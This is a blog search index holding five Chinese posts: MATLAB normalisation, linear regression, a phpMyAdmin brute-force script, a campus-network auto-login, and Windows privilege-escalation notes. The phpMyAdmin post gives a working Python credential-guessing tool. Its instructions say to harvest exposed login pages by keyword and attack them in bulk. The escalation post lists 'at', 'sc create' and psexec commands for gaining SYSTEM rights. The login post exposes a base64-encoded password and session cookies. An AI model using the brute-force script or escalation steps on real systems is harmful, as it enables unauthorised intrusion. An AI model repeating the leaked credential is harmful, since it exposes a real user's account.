<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>matlab中mapminmax函数的总结</title>
      <link href="/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/"/>
      <url>/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="01-mapminmax-函数"><a href="#01-mapminmax-函数" class="headerlink" title="01 mapminmax()函数"></a>01 mapminmax()函数</h2><p><code>mapminmax()</code>函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为<code>(0，1)</code>之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。</p><h2 id="02-函数接口"><a href="#02-函数接口" class="headerlink" title="02 函数接口"></a>02 函数接口</h2><pre><code>[Y,PS] = mapminmax(X)[Y,PS] = mapminmax(X,FP)Y = mapminmax(&#39;apply&#39;,X,PS)X = mapminmax(&#39;reverse&#39;,Y,PS)</code></pre><h3 id="02-1-函数参数说明"><a href="#02-1-函数参数说明" class="headerlink" title="02-1 函数参数说明"></a>02-1 函数参数说明</h3><p><code>Y</code>是归一化得到的数据，<code>PS</code>是一种描述数据的结构。它们的计算方式是<code>y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + ymin;</code></p><p>倘若这个向量里面有两个相同的数，那么上式就变成分母<code>xmax</code>-<code>xmin</code>为零，这样怎么处理？</p><p><code>matlab</code>在这时会变成<code>y=ymin</code>，<code>ymax</code>和<code>ymin</code>这两个值默认为<code>-1</code>到<code>1</code>，也可以自己设置。</p><p>设置举例：</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span> clear<span class="token operator">>></span> l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span> l <span class="token operator">=</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token operator">>></span> k<span class="token punctuation">.</span>ymin<span class="token operator">=</span><span class="token number">0</span> k <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> ymin<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">>></span> k<span class="token punctuation">.</span>ymax<span class="token operator">=</span><span class="token number">1</span> k <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> ymin<span class="token punctuation">:</span> <span class="token number">0</span>ymax<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token operator">>></span> <span class="token punctuation">[</span>m<span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token operator">=</span>mapminmax<span class="token punctuation">(</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span> m <span class="token operator">=</span> <span class="token number">0</span> <span class="token number">0.3333</span> <span class="token number">0.6667</span> <span class="token number">1.0000</span> n <span class="token operator">=</span> 包含以下字段的 struct<span class="token punctuation">:</span> name<span class="token punctuation">:</span> <span class="token string">'mapminmax'</span>xrows<span class="token punctuation">:</span> <span class="token number">1</span>xmax<span class="token punctuation">:</span> <span class="token number">4</span>xmin<span class="token punctuation">:</span> <span class="token number">1</span>xrange<span class="token punctuation">:</span> <span class="token number">3</span>yrows<span class="token punctuation">:</span> <span class="token number">1</span>ymax<span class="token punctuation">:</span> <span class="token number">1</span>ymin<span class="token punctuation">:</span> <span class="token number">0</span>yrange<span class="token punctuation">:</span> <span class="token number">1</span>gain<span class="token punctuation">:</span> <span class="token number">0.3333</span>xoffset<span class="token punctuation">:</span> <span class="token number">1</span>no_change<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token operator">></span> 上面还可以这样设置：<span class="token punctuation">[</span>Y<span class="token punctuation">,</span>PS<span class="token punctuation">]</span> <span class="token operator">=</span> mapminmax<span class="token punctuation">(</span>X<span class="token punctuation">,</span>ymin<span class="token punctuation">,</span>ymax<span class="token punctuation">)</span></code></pre><h2 id="03-函数接口说明"><a href="#03-函数接口说明" class="headerlink" title="03 函数接口说明"></a>03 函数接口说明</h2><p>上面已经讲了，<code>1</code>和<code>2</code>函数接口，<code>3</code>函数接口<code>Y = mapminmax(&#39;apply&#39;,X,PS)</code>主要是用来对其他向量采取同样的归一化（继续采用上面向量的<code>xmax</code>和<code>xmin</code>）对其归一化。 第三种<code>X = mapminmax(&#39;reverse&#39;,Y,PS)</code>就是对数据进行反归一化，就是通过存储在<code>PS</code>的结构的值计算原来的值。</p><h2 id="04-矩阵归一化"><a href="#04-矩阵归一化" class="headerlink" title="04 矩阵归一化"></a>04 矩阵归一化</h2><p>默认规范范围<code>(-1,1)</code>若想将规范范围划为<code>(-1,1)</code>，可编写<code>Y=mapminmax(A,0,1);</code></p><p>此函数规整行向量中最大最小值，如果运用此函数，则<code>A</code>矩阵每一行为一个维度，每一列是一个样本，所以一般在使用这个函数对样本进行归一化的时候就要将矩阵转置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习之线性回归方法</title>
      <link href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/"/>
      <url>/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="1-多元线性回归"><a href="#1-多元线性回归" class="headerlink" title="1. 多元线性回归"></a>1. 多元线性回归</h2><p>以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用<code>n</code>表示特征数目，<code>x(i)</code>表示的是训练集中第<code>i</code>个样本的特征向量，<code>x(i)j</code>表示的第<code>i</code>个样本的第<code>j</code>个特征值,同时为每个记录增加一个属性<code>x0=1</code>.对于这个预测房价的问题我们首先要估计未知参数<code>x0......xn</code>的值，为此我们进行<code>n</code>次独立观测，得到n组数据样本，将它们带入方程可以得到一个方程组，我们将其矩阵化表示。</p><h2 id="2-参数x0到xn的求解"><a href="#2-参数x0到xn的求解" class="headerlink" title="2.参数x0到xn的求解"></a>2.参数x0到xn的求解</h2><p>我们需要求得参数，需要使用参数的最小二乘估计，我们需要选择<code>x0-xn</code>的参数使残差平方和得到最小</p><p>残差平方和就是，实际值减去预测值的平方。</p><h3 id="2-1-梯度下降法"><a href="#2-1-梯度下降法" class="headerlink" title="2.1 梯度下降法"></a>2.1 梯度下降法</h3><p>梯度下降法：就是将残差平方和对每一个特征进行偏导，这个得到的倒数可以类似于一坡度，我们需要不断的根据这点的坡度逼近最低点，需要不停的进行迭代。在梯度下降之前，有时候数据不同特征之间存在很大的差距，有的范围在<code>1000-2000</code>之间，而有的仅在<code>0-10之</code>间，这时候就会使得大数吃小数的情况，同时使得数据不便处理，为了使得数据的范围大致相同，我们需要对数据进行归一化。目前有三种归一化方法：</p><p>1)<code>mapminmax</code>，最大最小化方法，缺点：当新数据加入的时候，可能导致<code>max</code>和<code>min</code>发生变化，需要重新定义。</p><p>2)<code>log</code>函数转换</p><p>3)<code>z-score</code> <code>normalization</code>:标准差标准化</p><p>算法原理：根据刚才得到的残差平方表示的方程组，对每一个特征的参数进行偏导，然后根据偏导不断迭代最终逼近残差最小的值，得到参数的估计值。</p><h3 id="2-2-利用归一化方程"><a href="#2-2-利用归一化方程" class="headerlink" title="2.2 利用归一化方程"></a>2.2 利用归一化方程</h3><p>刚才我们得到了残差平方和的式子，利用微积分的极值法，我们对每一个参数进行偏导使得等于0，得到一组方程组，将其表示成矩阵形式，移项等矩阵运算就得到归一化方程。</p><h3 id="2-3-两种求解方法的比较"><a href="#2-3-两种求解方法的比较" class="headerlink" title="2.3 两种求解方法的比较"></a>2.3 两种求解方法的比较</h3><p>1)梯度下降求解法：</p><p>优点：当<code>Features</code>数量很大的时候，就是特征数量很大的时候，梯度下降比归一化方程求解好。</p><p>缺点：需要将数据预处理，进行归一化，还要初始化学习速率，比较麻烦。</p><p>2)归一化方程：</p><p>优点：比较快速同时比较方便</p><p>缺点：当特征值特别多的时候比较慢，同时如果特征值之间存在多重共线性，导致x的转置乘以x将会没有逆矩阵，计算不出参数的估计值。</p><h2 id="3-回归方程和回归参数的显著性检验"><a href="#3-回归方程和回归参数的显著性检验" class="headerlink" title="3.回归方程和回归参数的显著性检验"></a>3.回归方程和回归参数的显著性检验</h2><p>我们通过上面建立的回归模型到底因变量和自变量是否存在线性关系？这个还需要们对其进行假设检验进行验证。</p><p>总离差平方和<code>SST</code>：数据的真实值<code>y</code>减去真实值的平均值的平方。反映了数据的波动性大小。<br>残差平方和<code>SSE</code>：真实值减去观测值的平方。 反映了除去<code>y</code>与<code>x</code>之间的线性关系之外的因素引起的数据y的波动。<br>回归平方和<code>SSR</code>：预测值减去真实值的平均值的平方。反映了线性拟合值与它们平均值的总偏差。</p><p>利用代数运算和正规方程组得到<code>SST=SSR+SSE</code>.所以<code>SSR</code>越大，说明由回归关系得到的观测值的波动性比例越大，就是说<code>y</code>与<code>x</code>的线性关系越显著，拟合效果越好。自由度相应的也需要进行分解，<code>n-1=(n-p-1)+p</code>最后基于自由度的分解，我们建立方差分析表。<code>SSR</code>均方差等于<code>MSR=SSR/P</code>,<code>MSE=SSE/(N-P-1)</code>,<code>F=MSR/MSE</code>。当假设<code>y</code>与<code>x1</code>,<code>x2</code>,…<code>xn</code>不存在线性关系时候，<code>F</code>服从于<code>F（p，n-p-1）</code>,尽管已经说明了<code>x</code>与<code>y</code>存在了线性关系，但是每一个特征值<code>x</code>都对<code>y</code>存在显著的影响吗？</p><p>所以我们还需要对其进行单个参数的假设检验。接下来我们需要一个拟合优度，它对于衡量模型对样本观测值的拟合程度，在总的离差平方和中，回归平方和占得比例越大，说明拟合效果越来越好，于是通过回归平方和与离差平方和的比例作为判优的标准。它越接近<code>1</code>，说明模型的拟合优度越高。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python批量爆破phpMyadmin</title>
      <link href="/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/"/>
      <url>/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="使用python实现phpMyadmin的批量爆破"><a href="#使用python实现phpMyadmin的批量爆破" class="headerlink" title="使用python实现phpMyadmin的批量爆破"></a>使用python实现phpMyadmin的批量爆破</h2><h3 id="0x01-脚本实现"><a href="#0x01-脚本实现" class="headerlink" title="0x01 脚本实现"></a>0x01 脚本实现</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup <span class="token keyword">as</span> bp<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"</span><span class="token punctuation">}</span>    session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        soup<span class="token operator">=</span>bp<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>        my_Dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"hidden"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">}</span>        tiqu<span class="token operator">=</span>soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>attrs<span class="token operator">=</span>my_Dict<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>        data<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span><span class="token operator">=</span>tiqu<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"no token"</span>        data<span class="token punctuation">[</span><span class="token string">'pma_username'</span><span class="token punctuation">]</span><span class="token operator">=</span>username        data<span class="token punctuation">[</span><span class="token string">'pma_password'</span><span class="token punctuation">]</span><span class="token operator">=</span>password        index_url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"index.php"</span>        response1<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>index_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        htmls<span class="token operator">=</span>response1<span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"phpMyAdmin is more friendly with a "</span> <span class="token keyword">in</span> htmls<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] username:{0}, password:{1}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./Good.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> urls<span class="token punctuation">:</span>        host_t<span class="token operator">=</span>urls<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> url <span class="token keyword">in</span> host_t<span class="token punctuation">:</span>            <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'\n'</span><span class="token punctuation">:</span>                url<span class="token operator">=</span>url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"mima.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> mima<span class="token punctuation">:</span>                my_mima<span class="token operator">=</span>mima<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> mima <span class="token keyword">in</span> my_mima<span class="token punctuation">:</span>                    username<span class="token punctuation">,</span>password<span class="token operator">=</span>mima<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"attack {0} use username:{1}|password:{2}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>                    attack<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span></code></pre><h3 id="0x02-脚本的使用"><a href="#0x02-脚本的使用" class="headerlink" title="0x02 脚本的使用"></a>0x02 脚本的使用</h3><ul><li>先用批量采集工具采集url（关键词：“欢迎使用 phpMyadmin”）</li><li>将采集的url导出为Good.txt路径</li><li>然后密码的格式为:    root|toor  ，|左边为root,右边为toor</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自动登陆校园网</title>
      <link href="/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/"/>
      <url>/2019/04/12/python-zi-dong-deng-lu-xiao-yuan-wang/</url>
      
        <content type="html"><![CDATA[<p>由于每次打开电脑都要手动的登录校园网，导致很麻烦，所以写了一个爬虫来模拟浏览器自动登录校园网的功能</p><h2 id="1-使用Burpsuit对校园网登录界面进行抓包分析"><a href="#1-使用Burpsuit对校园网登录界面进行抓包分析" class="headerlink" title="1.使用Burpsuit对校园网登录界面进行抓包分析"></a>1.使用Burpsuit对校园网登录界面进行抓包分析</h2><p>简介：<code>burpsuite</code>是一款渗透工具，运行环境是<code>Java</code>，所以需要先配置,主要可以用来对<code>HTTP</code>协议的工具包进行分析，也可以扫描网站的漏洞，接下来我们就用它来对校园网登录界面进行一个抓包。</p><h2 id="1-1-设置浏览器代理"><a href="#1-1-设置浏览器代理" class="headerlink" title="1.1 设置浏览器代理"></a>1.1 设置浏览器代理</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4me17q2j31780mztaq.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4mn5krcj30yz0ngmxc.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4mtmx08j30sg0j4dm0.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4n0lhg5j30sg0iyn5j.jpg" alt></p><p>代理，就是拦截到浏览器的前面将数据包截取下来。</p><h3 id="1-2-抓包分析"><a href="#1-2-抓包分析" class="headerlink" title="1.2 抓包分析"></a>1.2 抓包分析</h3><p>浏览器输入网址<code>http://10.10.1.6/srun_portal_pc.php?ac_id=1&amp;&amp;userurl=http://www.lzu.edu.cn</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4noqt36j308c04hq4f.jpg" alt></p><p>然后打开<code>burpsuite</code>，点击<code>forward</code>（前进），就是讲刚才浏览器进行的动作，发送的包截取下来。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4nv60kbj30z00kfdhb.jpg" alt></p><p>我们发现<code>post</code>一个表单到<code>auth_action.php</code>进行处理，在下面<code>cookie</code>里面有一个<code>login</code>还和上面一致。我们将报文复制一份进行分析，</p><pre><code>POST /include/auth_action.php HTTP/1.1Host: 10.10.1.6Content-Length: 116Accept: */*Origin: http://10.10.1.6X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://10.10.1.6/srun_portal_pc.php?ac_id=1&amp;&amp;userurl=http://www.lzu.edu.cnAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAhTQz7gmzQkugXpBZMrQUGiPHbG7NW34vDounugHSLx5A8mO4foZDYk3gvuzEOm8oE2SVDxfjaQLfPK6S3nHNRFaSa5KKhD%252FBgYozWIuXKWglZ6pYHmbs0l2KSqBUsQnuEp%252Fth0bbc%252BjfILH2xC501DX3AWRxf9c4IHUiuZZvZAhRsJGqlP9ypVRn9Ii6bTg%253D%253D; language=en; login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAhTQz7gmzQkugXpBZMrQUGiPHbG7NW34vDounugHSLx5A8mO4foZDYk3gvuzEOm8oE2SVDxfjaQLfPK6S3nHNRFaSa5KKhD%252FBgYozWIuXKWglZ6pYHmbs0l2KSqBUsQnuEp%252Fth0bbc%252BjfILH2xC501DX3AWRxf9c4IHUiuZZvZAhRsJGqlP9ypVRn9Ii6bTg%253D%253DConnection: closeaction=login&amp;username=********&amp;domain=@cernet&amp;password={B}MTk5NjEy&amp;ac_id=1&amp;user_ip=&amp;nas_ip=&amp;user_mac=&amp;save_me=1&amp;ajax=1</code></pre><p>下面是<code>post</code>出去的表单数据，<code>username</code>通过猜测肯定是用户名，然后<code>password</code>是密码，但是发现这个是一个加密的报文，我们来打开<code>firebug</code>查看下网页的<code>javascript</code>代码，发现是<code>base64</code>加密，<br><code>save_me</code>字段应该是是否记住密码，如果点击了记住密码就是<code>1</code>否则就是<code>0</code>，接下来我们验证一下这个密码字段是否是<code>base64</code>.</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4oac6qyj30z40ke0uj.jpg" alt></p><p>选中<code>password</code>字段，然后点击<code>send to decoder</code>，<code>decoder</code>是<code>burp</code>的一个编码解码模块，可以进行解码</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4ohgne3j30z90kigm7.jpg" alt></p><p>发现密码和输入的一致但是前面加了一个<code>{B}</code>，可能有什么标志位，接下来，我们继续对这个包进行分析，我们将它发送到<code>repeater</code>模块（中继器模块）可以对包进行修改。右击选中<code>send to repeater</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4oonn7hj30z10kntal.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4ouv13nj30yp0kj405.jpg" alt></p><p>选择<code>Go</code>,发送包，看返回结果是什么</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4p1f5saj30yl0kgjtp.jpg" alt></p><p><code>login_ok</code>说明我们已经模拟浏览器登陆成功，但是我想测试下去掉几个无关紧要的字段是否也可以登录呢。经过<code>repeater</code>发包测试发现只有这几个字段是必须的。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4p7dbl9j30yn0kegnv.jpg" alt></p><p>经过测试只有<code>request</code>是如上的请求报文，我们就可以登陆成功，接下来我们用<code>python</code>模拟这个请求发送数据。<br>以下是代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requesturl<span class="token operator">=</span><span class="token string">"http://10.10.1.6/include/auth_action.php"</span>password<span class="token operator">=</span><span class="token string">"{B}MTk5NjEy"</span>username<span class="token operator">=</span><span class="token string">"********"</span>ac_id<span class="token operator">=</span><span class="token string">'2'</span>save_me<span class="token operator">=</span><span class="token string">'1'</span>ajax<span class="token operator">=</span><span class="token string">'1'</span>cookie<span class="token operator">=</span><span class="token string">"login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAnZjIv2aOiNLgdcFisQOPGduNfpXrq1m1kMaO3V9pmNJPwW7CiRVsfuOiIH7CP%252BlGaKj03wx3EcoSa1nagEF2HgnfjJcmJl6udXJxskZT0T9dmFgWtrhEObjLeL%252B05%252B3BB0l8ay8RfSeheGn%252F6p7YnxP46H43utiPMSxuZEl5YwF0dIA%253D%253D; language=en; login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAnZjIv2aOiNLgdcFisQOPGduNfpXrq1m1kMaO3V9pmNJPwW7CiRVsfuOiIH7CP%252BlGaKj03wx3EcoSa1nagEF2HgnfjJcmJl6udXJxskZT0T9dmFgWtrhEObjLeL%252B05%252B3BB0l8ay8RfSeheGn%252F6p7YnxP46H43utiPMSxuZEl5YwF0dIA%253D%253D"</span>postdata<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">"username"</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>    <span class="token string">"ac_id"</span><span class="token punctuation">:</span>ac_id<span class="token punctuation">,</span>    <span class="token string">"save_me"</span><span class="token punctuation">:</span>save_me<span class="token punctuation">,</span>    <span class="token string">"ajax"</span><span class="token punctuation">:</span>ajax<span class="token punctuation">,</span>    <span class="token string">"action"</span><span class="token punctuation">:</span><span class="token string">"login"</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>req<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>postdata<span class="token punctuation">)</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">,</span>cookie<span class="token punctuation">)</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>admin提权为system</title>
      <link href="/2019/04/12/admin-ti-quan-wei-system/"/>
      <url>/2019/04/12/admin-ti-quan-wei-system/</url>
      
        <content type="html"><![CDATA[<p><code>windows</code>底下设置密码</p><pre><code>net user username *</code></pre><p>提醒输入密码，确认密码</p><p><code>net user</code>查看当前系统下面的用户账号 <code>XP</code>底下是<code>HelpAssistant</code>是远程协助的账号</p><p><code>net user username</code>查看当前系统这个账号的基本信息</p><p>属于那个组，属于管理员组，具有百分之九十九的账号权限。</p><p>从管理员提权到<code>SYSTEM</code></p><p>使用<code>at</code>命令 指定一个时间使得在某一个时间执行一个特定的任务， <code>at 18:30 /interactive</code> <code>cmd</code>执行完成后就会获取一个<code>SYSTEM</code>的<code>CMD</code>的权限。 可以使用<code>whoami</code>命令查看一个是什么权限，但是whoami是旨在服务器端运行的程序<br>接下来使用<code>system</code>权限杀掉掉<code>explor</code>桌面进程，在打开是不是就整个桌面的环境都是<code>SYSTEM</code>权限</p><p><code>cmd</code>下输入<code>taskmgr</code>，进入任务管理器，结束进程 ，在新建一个任务就会打开<code>explor</code>进程。现在打开的全部都是<code>system</code>权限</p><p>注意：这种方式<code>windows xp</code>,<code>2003</code>使用，到了<code>windows 8</code> <code>windows7</code> <code>At</code>命令就被删除了。</p><p><code>windows7</code>使用<code>sc</code>命令</p><p>使用<code>sc</code>可以创建一条系统的服务</p><pre><code>sc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interact</code></pre><p><code>interact</code>是交互式的 <code>syscmd</code> 是自己取的名字，<code>cmd /K start</code>是使用的重新打开一个<code>cmd</code>命令窗口。</p><p><code>services.msc</code>打开系统的服务</p><p><code>cmd</code>输入 <code>sc syscmd start</code>启动了<code>system</code>权限的<code>cmd</code>窗口 - 使用第三方的套件 下载之后，<code>psexec</code>提权</p><p><code>- -I</code> 交互式运行程序<br><code>-s</code> 把自己提升为一个<code>system</code>权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
